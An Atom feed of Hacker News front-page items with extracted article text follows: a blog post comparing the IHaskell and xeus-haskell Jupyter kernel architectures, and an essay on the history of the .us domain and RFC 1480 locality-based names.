<?xml version='1.0' encoding='UTF-8'?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2025-11-28T11:33:48.804032+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=46054661</id><title>Comparing xeus-Haskell and ihaskell kernels</title><updated>2025-11-28T11:33:59.093707+00:00</updated><content>&lt;doc fingerprint="7793997ebee888cd"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;A tale of two kernels&lt;/head&gt;
    &lt;head rend="h3"&gt;Overview&lt;/head&gt;
    &lt;p&gt;For developers integrating Haskell into data science workflows or interactive documentation, the Jupyter notebook is the standard interface. Currently, there are two primary ways to run Haskell in Jupyter: IHaskell and xeus-haskell.&lt;/p&gt;
    &lt;p&gt;While both achieve the same end user experience (executing Haskell code in cells) their internal architectures represent fundamentally different engineering trade-offs:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;IHaskell: “Do everything in Haskell.” It is a monolithic kernel that speaks the Jupyter protocol itself and drives GHC directly.&lt;/item&gt;
      &lt;item&gt;xeus-haskell: “Reuse the protocol machinery.” It delegates all protocol handling to a shared C++ framework (Xeus) and focuses only on connecting that framework to a Haskell interpreter (MicroHs).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This article explores those architectures side-by-side, with a focus on:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;How they plug into the Jupyter kernel model.&lt;/item&gt;
      &lt;item&gt;What their design implies for performance, deployment, and library compatibility.&lt;/item&gt;
      &lt;item&gt;Which one is likely the better fit for different use cases (data science, teaching, documentation, client-side execution, etc.).&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;The Jupyter Kernel Architecture&lt;/head&gt;
    &lt;p&gt;Jupyter is essentially a front-end that communicates with a computation server via a protocol (aptly called the Jupyter protocol). This computation server is called a kernel. All jupyter needs to know about a kernel is which ports to use to communicate different kinds of messages.&lt;/p&gt;
    &lt;p&gt;To understand the difference between IHaskell and xeus-haskell, we must first look at the “Kernel” abstraction. Jupyter is essentially a decoupled frontend (the web UI) that communicates with a computation engine (the Kernel) via a standardized protocol over ZeroMQ (ØMQ).&lt;/p&gt;
    &lt;p&gt;The Jupyter stack looks like this:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;JupyterLab / Notebook frontend (browser): Renders notebooks, lets you edit cells, handles user events.&lt;/item&gt;
      &lt;item&gt;Jupyter server (Python): Manages files, launches kernels, proxies messages.&lt;/item&gt;
      &lt;item&gt;Kernel (language backend): Actually executes your code.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The frontend and the kernel do not share memory. They talk over five distinct logical channels, each responsible for a specific type of message exchange:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Shell: The main request/reply loop. The frontend sends code execution requests here.&lt;/item&gt;
      &lt;item&gt;IOPub: A broadcast channel. The kernel publishes “side effects” here, such as stdout, stderr, and renderable data (plots, HTML).&lt;/item&gt;
      &lt;item&gt;Stdin: Allows the kernel to request input from the user (e.g., when a script asks for a password).&lt;/item&gt;
      &lt;item&gt;Control: A high-priority channel for system commands (like “Shutdown” or “Interrupt”) that must bypass the execution queue.&lt;/item&gt;
      &lt;item&gt;Heartbeat: A simple ping/pong socket to ensure the kernel is still alive.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;From Jupyter’s perspective, a “Haskell kernel” is just a process that:&lt;/p&gt;
    &lt;p&gt;1) Reads a connection file to discover what ports to bind to. 2) Speaks the protocol correctly on those five channels. 3) Evaluates Haskell code when asked, and sends back results.&lt;/p&gt;
    &lt;p&gt;Everything else is an internal design choice.&lt;/p&gt;
    &lt;head rend="h4"&gt;The Registration Spec&lt;/head&gt;
    &lt;p&gt;Jupyter discovers kernels via a JSON specification file (kernel.json). You can list these with &lt;code&gt;jupyter kernelspec list&lt;/code&gt;. A typical spec looks like this:&lt;/p&gt;
    &lt;code&gt;{"argv":["/home/yavinda/.cabal/bin/ihaskell","kernel","{connection_file}","--ghclib","/usr/lib/ghc/lib","+RTS","-M3g","-N2","-RTS"],"display_name":"Haskell","language":"haskell"}
&lt;/code&gt;
    &lt;p&gt;When Jupyter starts a kernel, it generates a connection file (represented by {connection_file} in the args above). This ephemeral JSON file tells the kernel which ports to bind to for the five channels:&lt;/p&gt;
    &lt;code&gt;{  
  "shell_port": 41083,  
  "iopub_port": 42347,  
  "stdin_port": 56773,  
  "control_port": 57347,  
  "hb_port": 34681,  
  "ip": "127.0.0.1",  
  "key": "aa072f60-5cac0ac2506b1a572678209a",  
  "transport": "tcp",  
  "signature_scheme": "hmac-sha256",  
  "kernel_name": "haskell"  
}
&lt;/code&gt;
    &lt;p&gt;Some notable fields:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Ports: One per channel (shell_port, iopub_port, etc.).&lt;/item&gt;
      &lt;item&gt;Key + signature_scheme: Used to sign messages (HMAC) so rogue processes can’t spoof messages.&lt;/item&gt;
      &lt;item&gt;Transport + IP: Usually TCP over localhost, but in principle could be remote.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Each of these ports is used to send different types of payloads to the kernel. So any implementation of the Jupyter protocol needs to handle these messages correctly (or at least, gracefully).&lt;lb/&gt; Both IHaskell and xeus-haskell parse this file and bind to these ports. The difference lies in how they implement the logic behind these sockets. IHaskell takes full responsibility for the protocol and evaluation. xeus-haskell lets Xeus (C++) handle protocol details and just plugs in a Haskell interpreter.&lt;/p&gt;
    &lt;head rend="h3"&gt;IHaskell’s architecture - the monolithic approach&lt;/head&gt;
    &lt;p&gt;IHaskell is a native Haskell implementation of the Jupyter protocol. It is a standalone binary that links against the GHC API and the ZeroMQ C bindings.&lt;/p&gt;
    &lt;head rend="h4"&gt;How it works&lt;/head&gt;
    &lt;p&gt;When you run IHaskell, you are running a Haskell executable that manages the entire lifecycle:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Protocol Layer: IHaskell uses Haskell libraries (like zeromq-haskell) to listen on the sockets directly. It manually serializes and deserializes the JSON messages defined by the Jupyter protocol.&lt;/item&gt;
      &lt;item&gt;Execution Layer: It uses the GHC API to act as an interactive execution environment. It effectively functions as a custom GHCi (REPL) instance wrapped in a network server.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Because IHaskell is the protocol implementation, it has to know and implement all of Jupyter’s message types and semantics itself. That’s a lot of fairly dull plumbing, but the payoff is a kernel that’s deeply integrated with GHC.&lt;/p&gt;
    &lt;head rend="h5"&gt;Architecture Nuances&lt;/head&gt;
    &lt;p&gt;Because IHaskell is a “thick” wrapper around GHC, it supports the full weight of the GHC ecosystem. Any library compatible with your system’s GHC can be loaded. However, this tight coupling means IHaskell is sensitive to GHC versions. If you upgrade your system compiler, you must often recompile IHaskell to match. IT’s no suprise then that most complaints around IHaskell are around installation and package management. You inherit all the complexity of GHC and your package manager while simultaneously trying to communicate with a client.&lt;/p&gt;
    &lt;head rend="h3"&gt;Xeus-haskell: The Middleware Approach&lt;/head&gt;
    &lt;p&gt;Xeus takes almost the opposite view: separate the Jupyter protocol from the language implementation.&lt;/p&gt;
    &lt;p&gt;Xeus is a C++ library implementation of the Jupyter protocol. It abstracts away the complexity of managing ZeroMQ sockets, message signing, and concurrency. Xeus-haskell is not a standalone implementation of the protocol. rather, it is a binding between the Xeus C++ library and a Haskell interpreter.&lt;/p&gt;
    &lt;p&gt;In this architecture, the “Language Kernel” box is split in two:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The Frontend (C++): Xeus handles the connection file, the heartbeat, and message validation. It implements the “boring” parts of the Jupyter spec.&lt;/item&gt;
      &lt;item&gt;The Backend (Haskell): The kernel implementer only needs to subclass a few C++ virtual methods.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;MicroHs&lt;/head&gt;
    &lt;p&gt;Xeus-haskell uses MicroHs as its engine. MicroHs is a small Haskell implementation, designed to be compact and simple. It implements a substantial subset of Haskell (roughly Haskell 2010 with some additions), but not the entire surface area of modern GHC.&lt;/p&gt;
    &lt;p&gt;This has some very tanglible benefits. Firstly, it has a much smaller runtime footprint so it’s easier to port to environments like WebAssembly (WASM). Secondly, (mostly related to the first point) it has a faster cold-start and simpler distribution.&lt;/p&gt;
    &lt;p&gt;The tradeoff, however, is that you can’t just cabal install any random GHC package and expect it to work. Advanced GHC features (Template Haskell, fancy type-level programming, certain extensions) may be unsupported or behave slightly differently.&lt;/p&gt;
    &lt;head rend="h4"&gt;Maintainance&lt;/head&gt;
    &lt;p&gt;Xeus’ architecture allows kernel writers to focus more on writing the kernel and less on ceremonious communication with the Jupyter client. A kernel author doesn’t need to reinvent message dispatch, heartbeat and control channels, content-type negotiation, rich display MIME handling etc. Instead, you implement a handful of methods like “execute this code” and “generate completions,” and Xeus wraps that in a fully compliant kernel.&lt;/p&gt;
    &lt;p&gt;Also, because the protocol logic is offloaded to the shared Xeus C++ library, updates are “free.” If Jupyter releases a new feature (like Debugger Protocol support), Xeus updates it for all supported languages (C++, Python, Lua, Haskell) simultaneously. Whereas IHaskell would have to write all the plumbing that supports the feature.&lt;/p&gt;
    &lt;head rend="h3"&gt;Differences&lt;/head&gt;
    &lt;head rend="h4"&gt;How they are run&lt;/head&gt;
    &lt;p&gt;Because the protocol implementation (Xeus) and the interpreter (MicroHs) are relatively small, xeus-haskell can be compiled to WebAssembly and run entirely in the browser (e.g. with JupyterLite or other WASM-hosted frontends). This enables client-side Haskell notebooks since there are no server kernel processes and there is no separate toolchain on the user’s machine.&lt;/p&gt;
    &lt;p&gt;IHaskell, by contrast, is built around the full GHC toolchain and runs either directly on your machine or in a containerized environment like Docker. This gives IHaskell a higher baseline of power and compatibility, but makes it much less suitable for pure client-side environments.&lt;/p&gt;
    &lt;head rend="h4"&gt;Ecosystem&lt;/head&gt;
    &lt;p&gt;Xeus only works with MicroHs compatible libraries (currently few but growing in number) whereas IHaskell works with any library in the GHC ecosystem.&lt;/p&gt;
    &lt;head rend="h4"&gt;Ease of use&lt;/head&gt;
    &lt;p&gt;Installation experience is where xeus-haskell tends to shine.&lt;/p&gt;
    &lt;p&gt;IHaskell needs a matching GHC version and often a specific build tool to smooth over dependency issues. The kernel itself (and the packages it uses) needs to be built with the same GHC that your notebooks will use. This is absolutely doable (and there are Docker images/VS Code devcontainers that make it trivial), but if you try to install IHaskell “natively” on a system with multiple GHCs and mixed tooling, it can be … educational.&lt;/p&gt;
    &lt;p&gt;xeus-haskell comes as a relatively self-contained package. You’re not wrangling the entire GHC ecosystem; you’re picking up MicroHs plus the kernel parts. The time between download to first-notebook-command in Xeus-Haskell could be as little as 5 minutes.&lt;/p&gt;
    &lt;head rend="h4"&gt;Execution model and performance&lt;/head&gt;
    &lt;p&gt;Both kernels are fundamentally interactive REPLs with state that accumulates over cells. Althought GHC code typically runs about 10 time faster than MicroHs code, in a xeus notebook the entirety of MicroHs is interpreted. This increases the performance gap.&lt;/p&gt;
    &lt;p&gt;In practice, for “toy” examples and teaching, both are fast enough. For heavier workloads (e.g. large dataframes, numeric computing, deep learning), IHaskell’s access to the full GHC ecosystem and native performance is a big advantage.&lt;/p&gt;
    &lt;p&gt;You can try both yourself to see the difference:&lt;/p&gt;
    &lt;head rend="h4"&gt;Deployment scenarios&lt;/head&gt;
    &lt;p&gt;Different architectures lend themselves to different deployment stories.&lt;/p&gt;
    &lt;p&gt;IHaskell is great for server-side notebooks. You can containerize IHaskell and ship it with JupyterHub on a cluster where each user gets an IHaskell kernel. Or you can use services like mybinder which work with Docker containers that already have Jupyter bundled.&lt;/p&gt;
    &lt;p&gt;Where does this leave Xeus-haskell? Xeus-Haskell us great for quick prototyping or for places where you’d like to embed Haskell without inheriting the whole toolchain. Think demos, talks, small/static websites.&lt;/p&gt;
    &lt;p&gt;In the words of the project’s creator (@tani):&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;The goal is to make Haskell more accessible in scientific/technical computing. Lazy evaluation can be surprisingly powerful for graph algorithms, recursive structures, and anything where “compute only what’s needed” brings real wins. Being able to demo that interactively in a notebook feels like the right direction.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;head rend="h3"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;For standard server-side data science, IHaskell remains the battle-tested standard. However, if you are building lightweight interactive documentation or require client-side execution (JupyterLite), xeus-haskell offers a compelling, modular architecture.&lt;/p&gt;
    &lt;p&gt;Both solutions have found usecases in DataHaskell and we’re excited to keep iterating on them to improve the Haskell data ecosystem.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.datahaskell.org/blog/2025/11/25/a-tale-of-two-kernels.html"/><published>2025-11-26T06:13:26+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46057266</id><title>Memories of .us</title><updated>2025-11-28T11:33:58.653201+00:00</updated><content>&lt;doc fingerprint="2608811b388096d9"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;memories of .us&lt;/head&gt;
    &lt;p&gt;How much do you remember from elementary school? I remember vinyl tile floors, the playground, the teacher sentencing me to standing in the hallway. I had a teacher who was a chess fanatic; he painted a huge chess board in the paved schoolyard and got someone to fabricate big wooden chess pieces. It was enough of an event to get us on the evening news. I remember Run for the Arts, where I tried to talk people into donating money on the theory that I could run, which I could not. I'm about six months into trying to change that and I'm good for a mediocre 5k now, but I don't think that's going to shift the balance on K-12 art funding.&lt;/p&gt;
    &lt;p&gt;I also remember a domain name: bridger.pps.k12.or.us&lt;/p&gt;
    &lt;p&gt;I have quipped before that computer science is a field mostly concerned with assigning numbers to things, which is true, but it only takes us so far. Computer scientists also like to organize those numbers into structures, and one of their favorites has always been the tree. The development of wide-area computer networking surfaced a whole set of problems around naming or addressing computer systems that belong to organizations. A wide-area network consists of a set of institutions that manage their own affairs. Each of those institutions may be made up of departments that manage their own affairs. A tree seemed a natural fit. Even the "low level" IP addresses, in the days of "classful" addressing, were a straightforward hierarchy: each dot separated a different level of the tree, a different step in an organizational hierarchy.&lt;/p&gt;
    &lt;p&gt;The first large computer networks, including those that would become the Internet, initially relied on manually building lists of machines by name. By the time the Domain Name System was developed, this had already become cumbersome. The rapid growth of the internet was hard to keep up with, and besides, why did any one central entity---Jon Postel or whoever---even care about the names of all of the computers at Georgia Tech? Like IP addressing, DNS was designed as a hierarchy with delegated control. A registrant obtains a name in the hierarchy, say gatech.edu, and everything "under" that name is within the control, and responsibility, of the registrant. This arrangement is convenient for both the DNS administrator, which was a single organization even after the days of Postel, and for registrants.&lt;/p&gt;
    &lt;p&gt;We still use the same approach today... mostly. The meanings of levels of the hierarchy have ossified. Technically speaking, the top of the DNS tree, the DNS root, is a null label referenced by a trailing dot. It's analogous to the '/' at the beginning of POSIX file paths. "gatech.edu" really should be written as "gatech.edu." to make it absolute rather than relative, but since resolution of relative URLs almost always recurses to the top of the tree, the trailing dot is "optional" enough that it is now almost always omitted. The analogy to POSIX file paths raises an interesting point: domain names are backwards. The 'root' is at the end, rather than at the beginning, or in other words, they run from least significant to most significant, rather than most significant to least significant. That's just... one of those things, you know? In the early days one wasn't obviously better than the other, people wrote hierarchies out both ways, and as the dust settled the left-to-right convention mostly prevailed but right-to-left hung around in some protocols. If you've ever dealt with endianness, this is just one of those things about computers that you have to accept: we cannot agree on which way around to write things.&lt;/p&gt;
    &lt;p&gt;Anyway, the analogy to file paths also illustrates the way that DNS has ossified. The highest "real" or non-root component of a domain name is called the top-level domain or TLD, while the component below it is called a second-level domain. In the US, it was long the case that top-level domains were fixed while second-level domains were available for registration. There have always been exceptions in other countries and our modern proliferation of TLDs has changed this somewhat, but it's still pretty much true. When you look at "gatech.edu" you know that "edu" is just a fixed name in the hierarchy, used to organize domain names by organization type, while "gatech" is a name that belongs to a registrant.&lt;/p&gt;
    &lt;p&gt;Under the second-level name, things get a little vague. We are all familiar with the third-level name "www," which emerged as a convention for web servers and became a practical requirement. Web servers having the name "www" under an organization's domain was such a norm for so many years that hosting a webpage directly at a second-level name came to be called a "naked domain" and had some caveats and complications.&lt;/p&gt;
    &lt;p&gt;Other than www, though, there are few to no standards for the use of third-level and below names. Larger organizations are more likely to use third-level names for departments, infrastructure operators often have complex hierarchies of names for their equipment, and enterprises the world 'round name their load-balanced webservers "www2," "www3" and up. If you think about it, this situation seems like kind of a failure of the original concept of DNS... we do use the hierarchy, but for the most part it is not intended for human consumption. Users are only expected to remember two names, one of which is a TLD that comes from a relatively constrained set.&lt;/p&gt;
    &lt;p&gt;The issue is more interesting when we consider geography. For a very long time, TLDs have been split into two categories: global TLDs, or gTLDs, and country-code TLDs, or ccTLDs. ccTLDs reflect the ISO country codes of each country, and are intended for use by those countries, while gTLDs are arbitrary and reflect the fact that DNS was designed in the US. The ".gov" gTLD, for example, is for use by the US government, while the UK is stuck with ".gov.uk". This does seem unfair but it's now very much cemented into the system: for the large part, US entities use gTLDs, while entities in other countries use names under their respective ccTLDs. The ".us" ccTLD exists just as much as all the others, but is obscure enough that my choice to put my personal website under .us (not an ideological decision but simply a result of where a nice form of my name was available) sometimes gets my email address rejected.&lt;/p&gt;
    &lt;p&gt;Also, a common typo for ".us" is ".su" and that's geopolitically amusing. .su is of course the ccTLD for the Soviet Union, which no longer exists, but the ccTLD lives on in a limited way because it became Structurally Important and difficult to remove, as names and addresses tend to do.&lt;/p&gt;
    &lt;p&gt;We can easily imagine a world where this historical injustice had been fixed: as the internet became more global, all of our US institutions could have moved under the .us ccTLD. In fact, why not go further? Geographers have long organized political boundaries into a hierarchy. The US is made up of states, each of which has been assigned a two-letter code by the federal government. We have ".us", why not "nm.us"?&lt;/p&gt;
    &lt;p&gt;The answer, of course, is that we do.&lt;/p&gt;
    &lt;p&gt;In the modern DNS, all TLDs have been delegated to an organization who administers them. The .us TLD is rightfully administered by the National Telecommunications and Information Administration, on the same basis by which all ccTLDs are delegated to their respective national governments. Being the US government, NTIA has naturally privatized the function through a contract to telecom-industrial-complex giant Neustar. Being a US company, Neustar restructured and sold its DNS-related business to GoDaddy. Being a US company, GoDaddy rose to prominence on the back of infamously tasteless television commercials, and its subsidiary Registry Services LLC now operates our nation's corner of the DNS.&lt;/p&gt;
    &lt;p&gt;But that's the present---around here, we avoid discussing the present so as to hold crushing depression at bay. Let's turn our minds to June 1993, and the publication of RFC 1480 "The US Domain." To wit:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Even though the original intention was that any educational institution anywhere in the world could be registered under the EDU domain, in practice, it has turned out with few exceptions, only those in the United States have registered under EDU, similarly with COM (for commercial). In other countries, everything is registered under the 2-letter country code, often with some subdivision. For example, in Korea (KR) the second level names are AC for academic community, CO for commercial, GO for government, and RE for research. However, each country may go its own way about organizing its domain, and many have.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Oh, so let's sort it out!&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;There are no current plans of putting all of the organizational domains EDU, GOV, COM, etc., under US. These name tokens are not used in the US Domain to avoid confusion.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Oh. Oh well.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Currently, only four year colleges and universities are being registered in the EDU domain. All other schools are being registered in the US Domain.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Huh?&lt;/p&gt;
    &lt;p&gt;RFC 1480 is a very interesting read. It makes passing references to so many facets of DNS history that could easily be their own articles. It also defines a strict, geography-based hierarchy for the .us domain that is a completely different universe from the one in which we now live. For example, we learned above that, in 1993, only four-year institutions were being placed under .edu. What about the community colleges? Well, RFC 1480 has an answer. Central New Mexico Community College would, of course, fall under cnm.cc.nm.us. Well, actually, in 1993 it was called the Technical-Vocational Institute, so it would have been tvi.tec.nm.us. That's right, the RFC describes both "cc" for community colleges and "tec" for technical institutes.&lt;/p&gt;
    &lt;p&gt;Even more surprising, it describes placing entities under a "locality" such as a city. The examples of localities given are "berkeley.ca.us" and "portland.wa.us", the latter of which betrays an ironic geographical confusion. It then specifies "ci" for city and "co" for county, meaning that the city government of our notional Portland, Washington would be ci.portland.wa.us. Agencies could go under the city government component (the RFC gives the example "Fire-Dept.CI.Los-Angeles.CA.US") while private businesses could be placed directly under the city (e.g. "IBM.Amonk.NY.US"). The examples here reinforce that the idea itself is different from how we use DNS today: The DNS of RFC 1480 is far more hierarchical and far more focused on full names, without abbreviations.&lt;/p&gt;
    &lt;p&gt;Of course, the concept is not limited to local government. RFC 1480 describes "fed.us" as a suffix for the federal government (the example "dod.fed.us" illustrates that this has not at all happened), and even "General Independent Entities" and "Distributed National Institutes" for those trickier cases.&lt;/p&gt;
    &lt;p&gt;We can draw a few lessons from how this proposal compares to our modern day. Back in the 1990s, .gov was limited to the federal government. The thinking was that all government agencies would move into .us, where the hierarchical structure made it easier to delegate management of state and locality subtrees. What actually happened was the opposite: the .us thing never really caught on, and a more straightforward and automated management process made .gov available to state and local governments. The tree has effectively been flattened.&lt;/p&gt;
    &lt;p&gt;That's not to say that none of these hierarchical names saw use. GoDaddy continues to maintain what they call the "usTLD Locality-Based Structure". At the decision of the relevant level of the hierarchy (e.g. a state), locality-based subdomains of .us can either be delegated to the state or municipality to operate, or operated by GoDaddy itself as the "Delegated Manager." The latter arrangement is far more common, and it's going to stay that way: RFC 1480 names are not dead, but they are on life support. GoDaddy's contract allows them to stop onboarding any additional delegated managers, and they have.&lt;/p&gt;
    &lt;p&gt;Few of these locality-based names found wide use, and there are even fewer left today. Multnomah County Library once used "multnomah.lib.or.us," which I believe was actually the very first "library" domain name registered. It now silently redirects to "multcolib.org", which we could consider a graceful name only in that the spelling of "Multnomah" is probably not intuitive to those not from the region. As far as I can tell, the University of Oregon and OGI (part of OHSU) were keeping very close tabs on the goings-on of academic DNS, as Oregon entities are conspicuously over-represented in the very early days of RFC 1480 names---behind only California, although Georgia Tech and Trent Heim of former Colorado company XOR both registered enough names to give their states a run for the money.&lt;/p&gt;
    &lt;p&gt;"co.bergen.nj.us" works, but just gets you a redirect notice page to bergencountynj.gov. It's interesting that this name is actually longer than the RFC 1480 name, but I think most people would agree that bergencountynj.gov is easier to remember. Some of that just comes down to habit, we all know ".gov", but some of it is more fundamental. I don't think that people often understand the hierarchical structure of DNS, at least not intuitively, and that makes "deeply hierarchical" (as GoDaddy calls them) names confusing.&lt;/p&gt;
    &lt;p&gt;Certainly the RFC 1480 names for school districts produced complaints. They were also by far the most widely adopted. You can pick and choose examples of libraries (.lib.[state].us) and municipal governments that have used RFC 1480 names, but school districts are another world: most school districts that existed at the time have a legacy of using RFC 1480 naming. As one of its many interesting asides, RFC 1480 explains why: the practice of putting school districts under [district].k12.[state].us actually predates RFC 1480. Indeed, the RFC seems to have been written in part to formalize the existing practice. The idea of the k12.[state].us hierarchy originated within IANA in consultation with InterNIC (newly created at the time) and the Federal Networking Council, a now-defunct advisory committee of federal agencies that made a number of important early decisions about internet architecture.&lt;/p&gt;
    &lt;p&gt;RFC 1480 is actually a revision on the slightly older RFC 1386, which instead of saying that schools were already using the k12 domains, says that "there ought to be a consistent scheme for naming them." It then says that the k12 branch has been "introduced" for that purpose. RFC 1386 is mostly silent on topics other than schools, so I think it was written to document the decision made about schools with other details about the use of locality-based domains left sketchy until the more thorough RFC 1480.&lt;/p&gt;
    &lt;p&gt;The decision to place "k12" under the state rather than under a municipality or county might seem odd, but the RFC gives a reason. It's not unusual for school districts, even those named after a municipality, to cover a larger area than the municipality itself. Albuquerque Public Schools operates schools in the East Mountains; Portland Public Schools operates schools across multiple counties and beyond city limits. Actually the RFC gives exactly that second one as an example:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;For example, the Portland school district in Oregon, is in three or four counties. Each of those counties also has non-Portland districts.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;I include that quote mostly because I think it's funny that the authors now know what state Portland is in. When you hear "DNS" you think Jon Postel, at least if you're me, but RFC 1480 was written by Postel along with a less familiar name, Ann Westine Cooper. Cooper was a coworker of Postel at USC, and RFC 1480 very matter-of-factly names the duo of Postel and Cooper as the administrator of the .US TLD. That's interesting considering that almost five years later Postel would become involved in a notable conflict with the federal government over control of DNS---one of the events that precipitated today's eccentric model of public-private DNS governance.&lt;/p&gt;
    &lt;p&gt;There are other corners of the RFC 1480 scheme that were not contemplated in 1993, and have managed to outlive many of the names that were. Consider, for example, our indigenous nations: these are an exception to the normal political hierarchy of the US. The Navajo Nation, for example, exists in a state that is often described as parallel to a state, but isn't really. Native nations are sovereign, but are also subject to federal law by statute, and subject to state law by various combinations of statute, jurisprudence, and bilateral agreement. I didn't really give any detail there and I probably still got something wrong, such is the complicated legal history and present of Native America. So where would a native sovereign government put their website? They don't fall under the traditional realm of .gov, federal government, nor do they fall under a state-based hierarchy. Well, naturally, the Navajo Nation is found at navajo-nsn.gov.&lt;/p&gt;
    &lt;p&gt;We can follow the "navajo" part but the "nsn" is odd, unless they spelled "nation" wrong and then abbreviated it, which I've always thought is what it looks like on first glance. No, this domain name is very much an artifact of history. When the problem of sovereign nations came to Postel and Cooper, the solution they adopted was a new affinity group, like "fed" and "k12" and "lib": "nsn", standing for Native Sovereign Nation. Despite being a late comer, nsn.us probably has the most enduring use of any part of the RFC 1480 concept. Dozens of pueblos, tribes, bands, and confederations still use it. squamishtribe.nsn.us, muckleshoot.nsn.us, ctsi.nsn.us, sandiapueblo.nsn.us.&lt;/p&gt;
    &lt;p&gt;Yet others have moved away... in a curiously "partial" fashion. navajo-nsn.gov as we have seen, but an even more interesting puzzler is tataviam-nsn.us. It's only one character away from a "standardized" NSN affinity group locality domain, but it's so far away. As best I can tell, most of these governments initially adopted "nsn.us" names, which cemented the use of "nsn" in a similar way to "state" or "city" as they appear in many .gov domains to this day. Policies on .gov registration may be a factor as well, the policies around acceptable .gov names seem to have gone through a long period of informality and then changed a number of times. Without having researched it too deeply, I have seen bits and pieces that make me think that at various points NTIA has preferred that .gov domains for non-federal agencies have some kind of qualifier to indicate their "level" in the political hierarchy. In any case, it's a very interesting situation because "native sovereign nation" is not otherwise a common term in US government. It's not like lawyers or lawmakers broadly refer to tribal governments as NSNs, the term is pretty much unique to the domain names.&lt;/p&gt;
    &lt;p&gt;So what ever happened to locality-based names? RFC 1480 names have fallen out of favor to such an extent as to be considered legacy by many of their users. Most Americans are probably not aware of this name hierarchy at all, despite it ostensibly being the unified approach for this country. In short, it failed to take off, and those sectors that had widely adopted it (such as schools) have since moved away. But why?&lt;/p&gt;
    &lt;p&gt;I put a lot of time into writing this, and I hope that you enjoy reading it. If you can spare a few dollars, consider supporting me on ko-fi. You'll receive an occasional extra, subscribers-only post, and defray the costs of providing artisanal, hand-built world wide web directly from Albuquerque, New Mexico.&lt;/p&gt;
    &lt;p&gt;As usual, there seem to be a few reasons. The first is user-friendliness. This is, of course, a matter of opinion---but anecdotally, many people seem to find deeply hierarchical domain names confusing. This may be a self-fulfilling prophecy, since the perception that multi-part DNS names are user-hostile means that no one uses them which means that no users are familiar with them. Maybe, in a different world, we could have broken out of that loop. I'm not convinced, though. In RFC 1480, Postel and Cooper argue that a deeper hierarchy is valuable because it allows for more entities to have their "obviously correct" names. That does make sense to me, splitting the tree up into more branches means that there is less name contention within each branch. But, well, I think it might be the kind of logic that is intuitive only those who work in computing. For the general public, I think long multi-part names quickly become difficult to remember and difficult to type. When you consider the dollar amounts that private companies have put into dictionary word domain names, it's no surprise that government agencies tend to prefer one-level names with full words and simple abbreviations.&lt;/p&gt;
    &lt;p&gt;I also think that the technology outpaced the need that RFC 1480 was intended to address. The RFC makes it very clear that Postel and Cooper were concerned about the growing size of the internet, and expected the sheer number of organizations going online to make maintenance of the DNS impractical. They correctly predicted the explosion of hosts, but not the corresponding expansion of the DNS bureaucracy. Between the two versions of the .us RFC, DNS operations were contracted to Network Solutions. This began a winding path that lead to delegation of DNS zones to various private organizations, most of which fully automated registration and delegation and then federated it via a common provisioning protocol. The size of, say, the .com zone really did expand beyond what DNS's designers had originally anticipated... but it pretty much worked out okay. The mechanics of DNS's maturation probably had a specifically negative effect on adoption of .us, since it was often under a different operator from the "major" domain names and not all "registrars" initially had access.&lt;/p&gt;
    &lt;p&gt;Besides, the federal government never seems to have been all that on board with the concept. RFC 1480 could be viewed as a casualty of the DNS wars, a largely unexplored path on the branch of DNS futures that involved IANA becoming completely independent of the federal government. That didn't happen. Instead, in 2003 .gov registration was formally opened to municipal, state, and tribal governments. It became federal policy to encourage use of .gov for trust reasons (DNSSEC has only furthered this), and .us began to fall by the wayside.&lt;/p&gt;
    &lt;p&gt;That's not to say that RFC 1480 names have ever gone away. You can still find many of them in use. state.nm.us doesn't have an A record, but governor.state.nm.us and a bunch of other examples under it do. The internet is littered with these locality-based names, many of them hiding out in smaller agencies and legacy systems. Names are hard to get right, and one of the reasons is that they're very hard to get rid of.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;When things are bigger, names have to be longer. There is an argument that with only 8-character names, and in each position allow a-z, 0-9, and -, you get 37**8 = 3,512,479,453,921 or 3.5 trillion possible names. It is a great argument, but how many of us want names like "xs4gp-7q". It is like license plate numbers, sure some people get the name they want on a vanity plate, but a lot more people who want something specific on a vanity plate can't get it because someone else got it first. Structure and longer names also let more people get their "obviously right" name.&lt;/p&gt;
    &lt;/quote&gt;
